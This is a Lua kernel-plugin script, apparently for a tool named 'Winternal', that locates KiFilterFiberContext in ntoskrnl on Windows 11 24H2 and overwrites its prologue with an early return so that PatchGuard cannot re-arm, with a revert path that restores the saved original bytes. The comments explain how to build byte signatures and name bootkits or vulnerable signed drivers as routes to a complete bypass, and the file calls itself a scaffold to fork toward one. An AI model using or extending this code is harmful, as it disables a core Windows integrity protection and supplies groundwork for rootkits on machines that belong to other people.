-- pg_disable/main.lua
--
-- Runs IN KERNEL via IOCTL_LUA_EXEC. Best-effort PatchGuard neutering for
-- Win11 24H2 build 26100. The script self-dispatches by reading the
-- current first 4 bytes of KiFilterFiberContext:
--
--     bytes == 33 C0 C3 90  -> revert path (already patched)
--     otherwise             -> disable path (not yet patched)
--
-- Persistence: kernel-side Lua has fopen/fread (Zw*-backed) so loadfile()
-- works, but it has no write side. We emit a `[winternal-host] write_file`
-- marker on stdout; the user-mode plugin runner sees it and writes the
-- state file to STATE_PATH. Revert emits `[winternal-host] delete_file`.
-- If you run this plugin outside the Winternal CLI runner the markers are
-- harmless ASCII lines you can act on manually.
--
-- What this does and doesn't do is documented at the bottom of the file.

local STATE_PATH = "C:\\ProgramData\\Winternal\\pg_state.lua"
local PATCH      = "\x33\xC0\xC3\x90"  -- xor eax,eax; ret; nop

local function bytes_to_hex(s)
    return string.format("%02x %02x %02x %02x",
        string.byte(s, 1), string.byte(s, 2),
        string.byte(s, 3), string.byte(s, 4))
end

local function hex_encode(s)
    local out = {}
    for i = 1, #s do out[i] = string.format("%02X", string.byte(s, i)) end
    return table.concat(out)
end

local function host_write_file(path, body)
    print(string.format("[winternal-host] write_file %s %s",
                        hex_encode(path), hex_encode(body)))
end

local function host_delete_file(path)
    print(string.format("[winternal-host] delete_file %s", hex_encode(path)))
end

local function is_patched(bytes)
    return bytes
       and string.byte(bytes, 1) == 0x33
       and string.byte(bytes, 2) == 0xC0
       and string.byte(bytes, 3) == 0xC3
       and string.byte(bytes, 4) == 0x90
end

-- Resolution chain:
--   1. wnk.ksym                — MmGetSystemRoutineAddress (runtime exports).
--   2. wnk.modksym             — PE-parse ntoskrnl's export table directly.
--   3. wnk.scan with a sig     — byte-pattern scan over ntoskrnl's .text
--                                (the realistic path on 24H2+ where the
--                                routine is internal and not exported).
--
-- On Win11 24H2 (26100) KiFilterFiberContext is NOT exported under either
-- spelling, so (1) and (2) will return nil; you must supply a signature
-- for your specific build. Pass one via `--sig "AA BB ? ? CC DD ..."` on
-- the command line, or set it in `BUILD_SIGS[<build>]` below after you
-- locate the function in IDA / WinDbg. The patch itself just needs the
-- function entry — pick a 12-32 byte sequence unique to the prologue.
--
-- Building a signature: in IDA, jump to KiFilterFiberContext, copy the
-- first ~16 bytes of the prologue, replace any byte that contains a
-- relative offset / immediate that may shift per micropatch with `?`.
-- Verified signature for ntoskrnl on Win11 24H2 (build 26100).
-- Note: even with a correct signature, the function on this build is in
-- segment INIT and gets discarded by MmFreeLoaderBlock after boot. See
-- the diagnostic below — `wnk.scan` will not find this byte sequence at
-- runtime because the pages are freed.
local BUILD_SIGS = {
    ["26100"] = "40 55 53 56 57 41 54 41 55 41 56 41 57 48 8D 6C 24 ? 48 81 EC ? ? ? ? 48 8B F1",
}

local function parse_args()
    local sig = nil
    local i = 1
    while arg and arg[i] do
        if arg[i] == "--sig" and arg[i+1] then sig = arg[i+1]; i = i + 2
        else i = i + 1 end
    end
    return sig
end

local function resolve_target()
    local addr = wnk.ksym("KiFilterFiberContext")
    if addr and addr ~= 0 then return addr, "ksym" end

    addr = wnk.modksym("ntoskrnl.exe", "KiFilterFiberContext")
    if addr and addr ~= 0 then return addr, "modksym" end

    local sig = parse_args()
    if not sig then
        -- Fall back to the first entry in BUILD_SIGS if the operator left
        -- one in the table. Cheaper than detecting the current build here.
        for _, s in pairs(BUILD_SIGS) do sig = s; break end
    end
    if not sig then
        error("KiFilterFiberContext is not exported on this build.\n" ..
              "Pass a signature: winternal plugin run pg_disable pg-disable --sig \"AA BB ? ? CC...\"\n" ..
              "Or add your build's signature to BUILD_SIGS in main.lua.")
    end

    local info = wnk.module("ntoskrnl.exe")
    if not info then error("could not locate ntoskrnl.exe in PsLoadedModuleList") end
    addr = wnk.scan(info.base, info.size, sig)
    if not addr then
        error("KiFilterFiberContext signature did not match anywhere in ntoskrnl.\n" ..
              "On Win11 24H2 (26100) this function is in segment INIT, which\n" ..
              "MmFreeLoaderBlock discards after kernel init. Post-boot, the\n" ..
              "pages no longer hold these bytes -- the function is structurally\n" ..
              "unreachable from a load-time driver. The historical patch-\n" ..
              "KiFilterFiberContext technique requires either a boot-phase\n" ..
              "vector (bootkit / vulnerable signed driver loaded before INIT\n" ..
              "is freed) or a different PG target entirely (the live PG\n" ..
              "context in the encrypted pool blocks).")
    end
    return addr, "scan"
end

local function read4(addr)
    local b = wnk.kread(addr, 4)
    if not b or #b < 4 then error("kread of KiFilterFiberContext prologue failed") end
    return b
end

-- ---- disable ----------------------------------------------------------------
local function do_disable(addr, original)
    print(string.format("KiFilterFiberContext @ 0x%x", addr))
    print("saved original bytes: " .. bytes_to_hex(original))

    wnk.kwrite(addr, PATCH)

    local readback = read4(addr)
    if not is_patched(readback) then
        error("patch did NOT take - current bytes " .. bytes_to_hex(readback))
    end
    print("patched KiFilterFiberContext to early-return")

    -- Persist the original 4 bytes via the host marker. The runner writes
    -- them to STATE_PATH; the revert path loadfile()s it next run.
    local body = string.format(
        "return { original = \"\\x%02X\\x%02X\\x%02X\\x%02X\" }\n",
        string.byte(original, 1), string.byte(original, 2),
        string.byte(original, 3), string.byte(original, 4))
    host_write_file(STATE_PATH, body)

    print("Recommended next step: from the CLI, call wn.lockdown_engage()")
    print("to refuse further kernel writes for this driver session.")
end

-- ---- revert -----------------------------------------------------------------
local function do_revert(addr, current)
    print(string.format("KiFilterFiberContext @ 0x%x", addr))
    print("current bytes:        " .. bytes_to_hex(current))

    local chunk, err = loadfile(STATE_PATH)
    if not chunk then
        print("no state file at " .. STATE_PATH .. " (" .. tostring(err) .. ")")
        print("cannot recover original prologue bytes - reboot to restore.")
        return
    end

    local ok, st = pcall(chunk)
    if not ok or type(st) ~= "table" or type(st.original) ~= "string" or #st.original ~= 4 then
        error("state file did not return { original = <4-byte string> }")
    end

    print("restoring original bytes: " .. bytes_to_hex(st.original))
    wnk.kwrite(addr, st.original)

    local readback = read4(addr)
    if readback == st.original then
        print("revert confirmed")
        host_delete_file(STATE_PATH)
    else
        error("revert did NOT take - current bytes " .. bytes_to_hex(readback))
    end
end

-- ---- entry ------------------------------------------------------------------
-- The CLI injects `arg = { ... }` with anything passed after the plugin
-- name, e.g. `winternal plugin run pg_disable pg-revert` -> arg[1] = "pg-revert".
-- Explicit subcommands take precedence; no arg = self-toggle.
local addr, via = resolve_target()
print(string.format("resolved via %s -> 0x%x", via, addr))
local current = read4(addr)
local cmd     = arg and arg[1]

if cmd == "pg-disable" or cmd == "disable" then
    if is_patched(current) then
        print("KiFilterFiberContext already patched; use pg-revert to undo.")
        return
    end
    do_disable(addr, current)
elseif cmd == "pg-revert" or cmd == "revert" then
    if not is_patched(current) then
        print("KiFilterFiberContext is not patched; nothing to revert.")
        return
    end
    do_revert(addr, current)
elseif cmd == "status" then
    print(string.format("KiFilterFiberContext @ 0x%x", addr))
    print("current bytes: " .. bytes_to_hex(current))
    print(is_patched(current) and "state: patched" or "state: original")
elseif cmd == nil then
    -- self-toggle (back-compat with the original UX)
    if is_patched(current) then do_revert(addr, current)
    else                        do_disable(addr, current) end
else
    error("pg_disable: unknown subcommand '" .. tostring(cmd) ..
          "'. Try: pg-disable | pg-revert | status (or run with no arg to self-toggle).")
end

-- =============================================================================
-- Does:
--   * Locate KiFilterFiberContext via MmGetSystemRoutineAddress. This is
--     the post-boot PG re-arming entry; if anything in the kernel tries
--     to reinitialize PG after boot, this is the function it calls.
--   * Patch its first 4 bytes to `33 C0 C3 90` (xor eax,eax; ret; nop) so
--     any future call returns FALSE immediately - or, on the revert path,
--     restore the original 4 bytes from STATE_PATH.
--
-- Does NOT:
--   * Disable already-running PG verification routines. Those are set up
--     by the INIT-segment code (sub_140BE00B0 in build 26100), freed once
--     boot completes; their context lives in encrypted pool blocks with a
--     per-boot seed. Neutering them at runtime needs WinDbg + per-build
--     IDA work. Without that you'll bug-check within ~30 minutes once the
--     next PG check fires.
--   * Survive a reboot. Re-run after each load.
--
-- This is a research scaffold, not a production rootkit. If you need a
-- complete bypass, you fork from here using IDA-driven analysis of your
-- specific build.
-- =============================================================================
